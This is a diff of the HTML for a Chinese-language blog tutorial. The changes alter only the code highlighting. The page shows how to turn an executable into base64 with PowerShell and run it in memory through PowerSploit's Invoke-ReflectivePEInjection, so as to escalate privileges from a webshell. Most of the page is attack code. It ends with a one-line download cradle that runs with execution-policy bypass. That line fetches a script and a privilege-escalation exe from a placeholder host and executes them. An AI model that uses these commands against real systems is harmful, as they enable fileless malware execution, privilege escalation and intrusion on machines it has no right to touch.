@@ -42,55 +42,55 @@
 <p><a href="http://www.freebuf.com/articles/terminal/99631.html">http://www.freebuf.com/articles/terminal/99631.html</a></p>
 <p>步骤:</p>
 <h3>转换到base64</h3>
-<div class="highlight"><pre><span></span><span class="nv">function</span> <span class="nv">Convert</span><span class="o">-</span><span class="nv">BinaryToString</span> {
+<div class="highlight"><pre><span></span><code><span class="k">function</span><span class="w"> </span><span class="nf">Convert</span><span class="o">-</span><span class="n">BinaryToString</span><span class="w"> </span><span class="err">{</span><span class="w"></span>
 
-   [<span class="nv">CmdletBinding</span><span class="ss">()</span>] <span class="nv">param</span> <span class="ss">(</span>
+<span class="w">   </span><span class="o">[</span><span class="n">CmdletBinding()</span><span class="o">]</span><span class="w"> </span><span class="n">param</span><span class="w"> </span><span class="p">(</span><span class="w"></span>
 
-      [<span class="nv">string</span>] <span class="mh">$F</span><span class="nv">ilePath</span>
+<span class="w">      </span><span class="o">[</span><span class="n">string</span><span class="o">]</span><span class="w"> </span><span class="err">$</span><span class="n">FilePath</span><span class="w"></span>
 
-   <span class="ss">)</span>
+<span class="w">   </span><span class="p">)</span><span class="w"></span>
 
-   <span class="nv">try</span> {
+<span class="w">   </span><span class="k">try</span><span class="w"> </span><span class="err">{</span><span class="w"></span>
 
-      <span class="mh">$B</span><span class="nv">yteArray</span> <span class="o">=</span> [<span class="nv">System</span>.<span class="nv">IO</span>.<span class="nv">File</span>]::<span class="nv">ReadAllBytes</span><span class="ss">(</span><span class="mh">$F</span><span class="nv">ilePath</span><span class="ss">)</span><span class="c1">;</span>
+<span class="w">      </span><span class="err">$</span><span class="n">ByteArray</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">[</span><span class="n">System.IO.File</span><span class="o">]::</span><span class="n">ReadAllBytes</span><span class="p">(</span><span class="err">$</span><span class="n">FilePath</span><span class="p">);</span><span class="w"></span>
 
-   }
+<span class="w">   </span><span class="err">}</span><span class="w"></span>
 
-   <span class="nv">catch</span> {
+<span class="w">   </span><span class="k">catch</span><span class="w"> </span><span class="err">{</span><span class="w"></span>
 
-      <span class="nv">throw</span> <span class="s2">&quot;</span><span class="s">Failed to read file. Ensure that you have permission to the file, and that the file path is correct.</span><span class="s2">&quot;</span><span class="c1">;</span>
+<span class="w">      </span><span class="k">throw</span><span class="w"> </span><span class="ss">&quot;Failed to read file. Ensure that you have permission to the file, and that the file path is correct.&quot;</span><span class="p">;</span><span class="w"></span>
 
-   }
+<span class="w">   </span><span class="err">}</span><span class="w"></span>
 
-   <span class="k">if</span> <span class="ss">(</span><span class="mh">$B</span><span class="nv">yteArray</span><span class="ss">)</span> {
+<span class="w">   </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="err">$</span><span class="n">ByteArray</span><span class="p">)</span><span class="w"> </span><span class="err">{</span><span class="w"></span>
 
-      <span class="mh">$Ba</span><span class="nv">se64String</span> <span class="o">=</span> [<span class="nv">System</span>.<span class="nv">Convert</span>]::<span class="nv">ToBase64String</span><span class="ss">(</span><span class="mh">$B</span><span class="nv">yteArray</span><span class="ss">)</span><span class="c1">;</span>
+<span class="w">      </span><span class="err">$</span><span class="n">Base64String</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">[</span><span class="n">System.Convert</span><span class="o">]::</span><span class="n">ToBase64String</span><span class="p">(</span><span class="err">$</span><span class="n">ByteArray</span><span class="p">);</span><span class="w"></span>
 
-   }
+<span class="w">   </span><span class="err">}</span><span class="w"></span>
 
-   <span class="k">else</span> {
+<span class="w">   </span><span class="k">else</span><span class="w"> </span><span class="err">{</span><span class="w"></span>
 
-      <span class="nv">throw</span> <span class="s1">&#39;</span><span class="s">$ByteArray is $null.</span><span class="s1">&#39;</span><span class="c1">;</span>
+<span class="w">      </span><span class="k">throw</span><span class="w"> </span><span class="s1">&#39;$ByteArray is $null.&#39;</span><span class="p">;</span><span class="w"></span>
 
-   }
+<span class="w">   </span><span class="err">}</span><span class="w"></span>
 
-   <span class="nv">Write</span><span class="o">-</span><span class="nv">Output</span> <span class="o">-</span><span class="nv">InputObject</span> <span class="mh">$Ba</span><span class="nv">se64String</span><span class="c1">;</span>
+<span class="w">   </span><span class="k">Write</span><span class="o">-</span><span class="k">Output</span><span class="w"> </span><span class="o">-</span><span class="n">InputObject</span><span class="w"> </span><span class="err">$</span><span class="n">Base64String</span><span class="p">;</span><span class="w"></span>
 
-}
-</pre></div>
+<span class="err">}</span><span class="w"></span>
+</code></pre></div>
 
 
 <p>将这个文件保存为exe2base64.ps1, 使用powershell加载，</p>
-<div class="highlight"><pre><span></span><span class="p">.</span> <span class="p">.</span><span class="err">\</span><span class="n">exe2base</span><span class="p">.</span><span class="n">ps1</span>
-<span class="k">Convert</span><span class="o">-</span><span class="n">BinaryToString</span> <span class="p">[</span><span class="n">path</span> <span class="k">of</span> <span class="n">exe</span><span class="p">]</span> <span class="o">&gt;</span> <span class="n">res</span><span class="p">.</span><span class="n">txt</span>
-</pre></div>
+<div class="highlight"><pre><span></span><code><span class="err">. .\exe2base.ps1</span>
+<span class="err">Convert-BinaryToString [path of exe] &gt; res.txt</span>
+</code></pre></div>
 
 
 <p>这里的exe需要绝对路径，因为一般来说转换之后的结果都比较大，所以重定向到文件比较好</p>
 <h3>加载执行</h3>
 <p><a href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-ReflectivePEInjection.ps1">https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-ReflectivePEInjection.ps1</a> </p>
 <p>脚本下载下来，打开之后加上:</p>
-<div class="highlight"><pre><span></span><span class="err">$</span><span class="n">InputString</span> <span class="o">=</span> <span class="s1">&#39;...........&#39;</span>
+<div class="highlight"><pre><span></span><code><span class="err">$</span><span class="n">InputString</span> <span class="o">=</span> <span class="s1">&#39;...........&#39;</span>
 <span class="o">#</span> <span class="err">将二进制字符串转为字节数组</span>
 
 <span class="err">$</span><span class="n">PEBytes</span> <span class="o">=</span> <span class="p">[</span><span class="k">System</span><span class="p">.</span><span class="k">Convert</span><span class="p">]::</span><span class="n">FromBase64String</span><span class="p">(</span><span class="err">$</span><span class="n">InputString</span><span class="p">)</span>
@@ -98,7 +98,7 @@
 <span class="o">#</span> <span class="err">在内存中运行</span> <span class="n">EXE</span>
 
 <span class="n">Invoke</span><span class="o">-</span><span class="n">ReflectivePEInjection</span> <span class="o">-</span><span class="n">PEBytes</span> <span class="err">$</span><span class="n">PEBytes</span> <span class="o">-</span><span class="n">ExeArgs</span> <span class="ss">&quot;Arg1 Arg2 Arg3 Arg4&quot;</span> <span class="o">-</span><span class="n">ForceASLR</span>
-</pre></div>
+</code></pre></div>
 
 
 <p>然后在webshell里面可以直接提权:</p>
@@ -109,8 +109,8 @@
 <hr>
 <p><a href="https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-ReflectivePEInjection/Invoke-ReflectivePEInjection.ps1">https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-ReflectivePEInjection/Invoke-ReflectivePEInjection.ps1</a> 
 这个可以使用PEUrl选项，直接远程加载exe，可以在webshell里面直接执行：</p>
-<div class="highlight"><pre><span></span><span class="nv">powershell</span>.<span class="nv">exe</span> <span class="o">-</span><span class="k">exec</span> <span class="nv">bypass</span> <span class="o">-</span><span class="nv">nop</span> <span class="o">-</span><span class="nv">c</span> <span class="s2">&quot;</span><span class="s">IEX (New-Object Net.WebClient).DownloadString(&#39;http://x.x.x.x/pe.ps1&#39;);Invoke-ReflectivePEInjection -PEUrl http://x.x.x.x/16-032.exe -ExeArgs &#39;whoami&#39; -ForceASLR</span><span class="s2">&quot;</span>  
-</pre></div>
+<div class="highlight"><pre><span></span><code><span class="err">powershell.exe -exec bypass -nop -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http://x.x.x.x/pe.ps1&#39;);Invoke-ReflectivePEInjection -PEUrl http://x.x.x.x/16-032.exe -ExeArgs &#39;whoami&#39; -ForceASLR&quot;  </span>
+</code></pre></div>
     </div><!-- /.entry-content -->
 
   </article>
